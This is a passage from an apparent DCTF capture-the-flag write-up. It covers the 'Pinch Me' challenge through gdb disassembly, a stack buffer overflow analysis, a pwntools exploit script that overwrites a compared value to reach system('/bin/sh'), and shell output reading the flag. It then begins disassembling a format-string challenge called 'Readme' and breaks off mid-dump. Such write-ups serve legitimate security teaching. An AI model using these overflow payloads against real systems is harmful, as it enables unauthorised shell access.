</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="nf">dctf</span><span class="err">{</span><span class="no">Ju5t_m0v3_0n</span><span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">Pinch</span> <span class="no">Me</span>
</span></span></code></pre></div><p>This challenge was also simple, loading the binary in gdb and checking the functions it contains, we can see that there’s a main function and vuln functions which are of interest:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d5</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d6</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d9</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0xa</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011de</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401050</span> <span class="p">&lt;</span><span class="no">alarm@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011e3</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011e8</span> <span class="err">&lt;+</span><span class="mi">19</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401152</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011ed</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011f2</span> <span class="err">&lt;+</span><span class="mi">29</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011f3</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401152</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401153</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401156</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x20</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040115a</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0x1234567</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401161</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="mi">0x89abcdef</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401168</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe99</span><span class="p">]</span>        <span class="c1"># 0x402008
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040116f</span> <span class="err">&lt;+</span><span class="mi">29</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401174</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xebd</span><span class="p">]</span>        <span class="c1"># 0x402038
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040117b</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401180</span> <span class="err">&lt;+</span><span class="mi">46</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2ec9</span><span class="p">]</span>        <span class="c1"># 0x404050 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000401187</span> <span class="err">&lt;+</span><span class="mi">53</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040118b</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x64</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401190</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401193</span> <span class="err">&lt;+</span><span class="mi">65</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401060</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000401198</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="mi">0x1337c0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040119f</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x4011af</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">93</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011a1</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe9f</span><span class="p">]</span>        <span class="c1"># 0x402047
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004011a8</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401040</span> <span class="p">&lt;</span><span class="no">system@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011ad</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x4011d2</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">128</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011af</span> <span class="err">&lt;+</span><span class="mi">93</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0x1234567</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011b6</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x4011c6</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">116</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011b8</span> <span class="err">&lt;+</span><span class="mi">102</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe90</span><span class="p">]</span>        <span class="c1"># 0x40204f
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004011bf</span> <span class="err">&lt;+</span><span class="mi">109</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011c4</span> <span class="err">&lt;+</span><span class="mi">114</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x4011d2</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">128</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011c6</span> <span class="err">&lt;+</span><span class="mi">116</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe93</span><span class="p">]</span>        <span class="c1"># 0x402060
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000004011cd</span> <span class="err">&lt;+</span><span class="mi">123</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x401030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d2</span> <span class="err">&lt;+</span><span class="mi">128</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004011d3</span> <span class="err">&lt;+</span><span class="mi">129</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000004011d4</span> <span class="err">&lt;+</span><span class="mi">130</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>The vuln function has an obvious buffer overflow as same as of the Pwn Sanity only the size changed yet the vulnerability remains the same, the function checks whether the variable stored at the <code>rbp - 0x8</code> is equal to the <code>0x1337c0de</code> and if it does calls <code>system(&quot;/bin/sh&quot;)</code>, so in order to do, we know that the buffer we control the input for is stored at <code>rbp - 0x20</code> and the <code>rbp - 0x8</code> was compared to the value of <code>0x1337c0de</code>, so we can just do 0x20 - 0x8 to get the offset for the variable we need to control the input for which would be <code>0x20 - 0x8 = 24</code>, hence <code>24</code> is the offset for the comparing value, then we can just grab the flag from the server:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf1-chall-pinch-me.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7480</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">24</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1337c0de</span><span class="p">)</span> <span class="c1"># integer is 4 bytes, hence p32()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Run</span> <span class="n">the</span> <span class="n">exploit</span><span class="p">:</span><span class="o">-</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">python3</span> <span class="n">pinch_me</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">dctf1</span><span class="o">-</span><span class="n">chall</span><span class="o">-</span><span class="n">pinch</span><span class="o">-</span><span class="n">me</span><span class="o">.</span><span class="n">westeurope</span><span class="o">.</span><span class="n">azurecontainer</span><span class="o">.</span><span class="n">io</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">7480</span><span class="p">:</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl"><span class="n">Am</span> <span class="n">I</span> <span class="n">dreaming</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="nb">id</span>
</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">pilot</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">dctf</span><span class="p">{</span><span class="n">y0u_kn0w_wh4t_15_h4pp3n1ng_b75</span><span class="err">?</span><span class="p">}</span><span class="err">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
</span></span></code></pre></div><h3 id="readme" class="relative group">Readme <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#readme" aria-label="Anchor">#</a></span></h3><p>This one was a very basic format string challenge, checking the vuln function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000085a</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000085b</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000085e</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x60</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000862</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000086b</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000086f</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000871</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x13c</span><span class="p">]</span>        <span class="c1"># 0x9b4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000000878</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x137</span><span class="p">]</span>        <span class="c1"># 0x9b6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000087f</span> <span class="err">&lt;+</span><span class="mi">37</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x730</span> <span class="p">&lt;</span><span class="no">fopen@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000884</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x58</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000888</span> <span class="err">&lt;+</span><span class="mi">46</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x58</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000088c</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x50</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000890</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x1c</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000895</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000898</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x720</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000089d</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x58</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008a1</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008a4</span> <span class="err">&lt;+</span><span class="mi">74</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x6e0</span> <span class="p">&lt;</span><span class="no">fclose@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008a9</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x10f</span><span class="p">]</span>        <span class="c1"># 0x9bf
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000008b0</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x6d0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008b5</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200754</span><span class="p">]</span>        <span class="c1"># 0x201010 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000008bc</span> <span class="err">&lt;+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x30</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008c0</span> <span class="err">&lt;+</span><span class="mi">102</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x1e</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008c5</span> <span class="err">&lt;+</span><span class="mi">107</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008c8</span> <span class="err">&lt;+</span><span class="mi">110</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x720</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008cd</span> <span class="err">&lt;+</span><span class="mi">115</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x104</span><span class="p">]</span>        <span class="c1"># 0x9d8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000008d4</span> <span class="err">&lt;+</span><span class="mi">122</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008d9</span> <span class="err">&lt;+</span><span class="mi">127</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x700</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008de</span> <span class="err">&lt;+</span><span class="mi">132</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x30</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008e2</span> <span class="err">&lt;+</span><span class="mi">136</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008e5</span> <span class="err">&lt;+</span><span class="mi">139</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008ea</span> <span class="err">&lt;+</span><span class="mi">144</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x700</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008ef</span> <span class="err">&lt;+</span><span class="mi">149</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008f0</span> <span class="err">&lt;+</span><span class="mi">150</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008f4</span> <span class="err">&lt;+</span><span class="mi">154</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008fd</span> <span class="err">&lt;+</span><span class="mi">163</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x904</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">170</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000008ff</span> <span class="err">&lt;+</span><span class="mi">165</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x6f0</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
